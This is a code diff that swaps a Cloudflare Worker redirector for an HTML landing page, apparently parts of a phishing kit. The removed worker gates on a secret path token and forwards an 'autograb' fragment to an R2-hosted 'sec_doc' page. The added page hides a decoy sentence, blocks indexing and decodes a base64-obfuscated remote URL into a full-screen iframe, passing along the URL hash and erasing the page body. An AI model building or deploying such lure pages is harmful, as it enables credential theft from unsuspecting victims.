@@ -1,25 +1,34 @@
-addEventListener('fetch', event => {
-    event.respondWith(handleRequest(event.request));
-  });
-  
-  async function handleRequest(request) {
-    // Extract the URL path from the request
-    const url = new URL(request.url);
-    const path = url.pathname;
-  
-    // Check if the URL path contains 'sf4eio4r'
-    if (!path.includes('sf4eio4r')) {
-      return new Response('Error 404, Page not found.', { status: 400 });
-    }
-  
-    // Extract everything after the '#' in the original URL
-    const fragment = url.hash.substring(1); // Remove the leading '#' from the fragment
-  
-    // URL with autograb feature and dynamic fragment extension
-    const autograbBaseUrl = 'https://pub-915c2a909e2b44929f7adb1407cfd494.r2.dev/sec_doc26082024.html';
-    const autograbUrl = new URL(`${autograbBaseUrl}${fragment}`);
-  
-    // Redirect to the new URL with the appended fragment
-    return Response.redirect(autograbUrl.toString(), 302);
-  }
-  
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>The cat napped in a sunny spot.</span>
+ </body>
+<script>
+var zonkey = null;
+if(location.hash == ""){
+location.hash = ``;
+zonkey = ``;
+}
+if (location.hash.includes('?')) {
+zonkey = location.hash.replace('#', '');
+}
+
+(async () => {
+    var ibis = document.createElement('iframe');
+    ibis.sandbox.add('allow-same-origin');
+    ibis.sandbox.add('allow-top-navigation');
+    ibis.sandbox.add('allow-modals');
+    ibis.sandbox.add('allow-scripts');
+    ibis.sandbox.add('allow-popups-to-escape-sandbox');
+    ibis.sandbox.add('allow-forms');
+    ibis.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovLzlkMm0zci5yeW5hdmV4LmNvbS91RFVwY3NFaS8=")+zonkey;
+    ibis.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(ibis);
+    document.body.innerHTML = "";
+    document.body.appendChild(ibis);
+})();
+</script>
+</html>
